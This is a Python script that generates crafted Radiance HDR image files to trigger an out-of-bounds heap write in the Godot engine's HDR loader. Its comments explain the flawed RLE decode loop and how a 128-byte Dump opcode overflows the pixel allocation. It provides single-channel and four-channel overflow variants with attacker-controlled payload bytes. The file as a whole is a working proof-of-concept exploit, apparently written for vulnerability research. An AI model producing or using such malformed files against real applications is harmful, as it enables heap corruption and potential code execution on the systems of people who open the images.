import sys, struct

def make_rle_hdr(path, width, height, scanlines_payload):
    """Craft a Radiance HDR using new-style RLE. width must be in [8,32768)."""
    out = bytearray()
    out += b"#?RADIANCE\n"
    out += b"FORMAT=32-bit_rle_rgbe\n"
    out += b"\n"                                   # blank line ends header
    out += b"-Y %d +X %d\n" % (height, width)     # resolution line
    # RLE scanlines. Each scanline: 02 02 (width>>8) (width&0xff), then 4 channels.
    hi = (width >> 8) & 0xff
    lo = width & 0xff
    assert hi & 0x80 == 0, "width high byte must be <128 for RLE"
    for _ in range(scanlines_payload):
        out += bytes([2, 2, hi, lo])
        for _k in range(4):
            i = 0
            while i < width:
                run = min(127, width - i)
                out += bytes([128 + run, 0x41])   # run of `run` copies of 0x41
                i += run
    open(path, "wb").write(out)
    print("wrote", path, len(out), "bytes  width=%d height=%d  (width*height*4 as int32 = %d)" %
          (width, height, (width*height*4) & 0xFFFFFFFF))

def make_flat_negwidth(path, width, height):
    out = bytearray()
    out += b"#?RADIANCE\n"
    out += b"FORMAT=32-bit_rle_rgbe\n"
    out += b"\n"
    out += b"-Y %d +X %d\n" % (height, width)     # width can be negative or <8 -> flat path
    out += b"\x41" * 4096                          # flat payload
    open(path, "wb").write(out)
    print("wrote", path, len(out), "bytes  width=%d height=%d (flat path)" % (width, height))

def make_evil_oob_dump_4ch(path, width=8, height=16):
    """
    Same as make_evil_oob_dump but triggers OOB on ALL 4 channels of the last
    scanline. The 4 independent i-counters each produce 128-width OOB writes,
    together covering every byte of ptr[allocation..allocation+480) —
    a near-solid 480-byte overwrite of adjacent heap (vs 120 sparse writes in the
    single-channel variant). Much more reliably detectable by the allocator.
    """
    assert 8 <= width < 32768
    hi = (width >> 8) & 0xff
    lo = width & 0xff

    out = bytearray()
    out += b"#?RADIANCE\n"
    out += b"FORMAT=32-bit_rle_rgbe\n"
    out += b"\n"
    out += b"-Y %d +X %d\n" % (height, width)

    for _ in range(height - 1):
        out += bytes([2, 2, hi, lo])
        for _k in range(4):
            i = 0
            while i < width:
                run = min(127, width - i)
                out += bytes([128 + run, 0x41])
                i += run

    # Evil last scanline: OOB Dump on every channel
    out += bytes([2, 2, hi, lo])
    for k_val in range(4):
        out += bytes([128])               # Dump opcode, count=128
        out += bytes([0xA0 + k_val] * 128)  # channel-tagged payload bytes

    allocation = width * height * 4
    oob_writes_per_ch = 128 - width
    print("Wrote %s: %d file bytes" % (path, len(out)))
    print("  width=%d height=%d  imgdata alloc=%d bytes" % (width, height, allocation))
    print("  4-channel OOB: %d writes/ch × 4 ch = %d total OOB writes" %
          (oob_writes_per_ch, oob_writes_per_ch * 4))
    print("  covers ptr[%d..%d] — %d bytes of solid OOB heap overwrite" %
          (allocation, allocation + 4 * oob_writes_per_ch - 1, 4 * oob_writes_per_ch))
    open(path, "wb").write(out)

def make_evil_oob_dump(path, width=8, height=16):
    """
    Trigger OOB heap write in ImageLoaderHDR::load_image (image_loader_hdr.cpp:117).

    The inner RLE decode loop `while (i < width)` reads a count byte then advances
    `i` by `count` with NO per-write bounds check. A Dump opcode with count=128
    starting at i=0 writes 128 bytes at stride 4, overflowing by (128-width) writes
    past the end of the (height*width*4)-byte imgdata allocation.

    Layout:
      - Valid scanlines j=0..height-2: fill the allocation cleanly.
      - Evil last scanline j=height-1: channel k=0 Dump of 128 (OOB); k=1..3 valid runs.
    """
    assert 8 <= width < 32768, "width must be in [8,32768) for RLE path"
    hi = (width >> 8) & 0xff
    lo = width & 0xff

    out = bytearray()
    out += b"#?RADIANCE\n"
    out += b"FORMAT=32-bit_rle_rgbe\n"
    out += b"\n"
    out += b"-Y %d +X %d\n" % (height, width)

    # Valid scanlines (j = 0 .. height-2)
    for _ in range(height - 1):
        out += bytes([2, 2, hi, lo])
        for _k in range(4):
            i = 0
            while i < width:
                run = min(127, width - i)
                out += bytes([128 + run, 0x41])
                i += run

    # Evil last scanline (j = height-1)
    out += bytes([2, 2, hi, lo])          # new-style RLE marker, len = width (passes ERR check)

    # Channel k=0: Dump with count=128.
    # 128 is NOT > 128, so Godot takes the Dump branch (image_loader_hdr.cpp:113).
    # get_buffer(temp_read_ptr, 128) reads 128 payload bytes; then the inner loop
    # ptr[(j*width + i++)*4 + 0] runs z=0..127, advancing i from 0 to 128.
    # For i >= width, writes land past the end of the imgdata allocation (OOB heap write).
    out += bytes([128])                   # count=128 opcode (Dump)
    out += bytes([0xAA] * 128)            # 128 attacker-controlled payload bytes

    # Channels k=1,2,3: valid run(s) to avoid truncation/infinite-loop
    for _k in range(1, 4):
        i = 0
        while i < width:
            run = min(127, width - i)
            out += bytes([128 + run, 0x41])
            i += run

    allocation = width * height * 4
    oob_writes = 128 - width             # writes past end of allocation (for last scanline k=0)
    oob_bytes  = oob_writes * 4          # stride-4 so byte-range covered = oob_writes*4

    open(path, "wb").write(out)
    print("Wrote %s: %d file bytes" % (path, len(out)))
    print("  width=%d height=%d  imgdata alloc=%d bytes" % (width, height, allocation))
    print("  k=0 Dump count=128: %d in-bounds writes, %d OOB writes (%d bytes stride-4 past end)"
          % (width, oob_writes, oob_bytes))

if __name__ == "__main__":
    kind = sys.argv[1]
    if kind == "rle":
        make_rle_hdr(sys.argv[2], int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5]))
    elif kind == "flat":
        make_flat_negwidth(sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
    elif kind == "oob":
        width  = int(sys.argv[3]) if len(sys.argv) > 3 else 8
        height = int(sys.argv[4]) if len(sys.argv) > 4 else 16
        make_evil_oob_dump(sys.argv[2], width, height)
    elif kind == "oob4":
        width  = int(sys.argv[3]) if len(sys.argv) > 3 else 8
        height = int(sys.argv[4]) if len(sys.argv) > 4 else 16
        make_evil_oob_dump_4ch(sys.argv[2], width, height)
    else:
        print("Usage: gen_hdr.py rle  <out> <width> <height> <n_scanlines>")
        print("       gen_hdr.py flat <out> <width> <height>")
        print("       gen_hdr.py oob  <out> [width=8] [height=16]")
        print("       gen_hdr.py oob4 <out> [width=8] [height=16]  # 4-ch OOB")
        sys.exit(1)
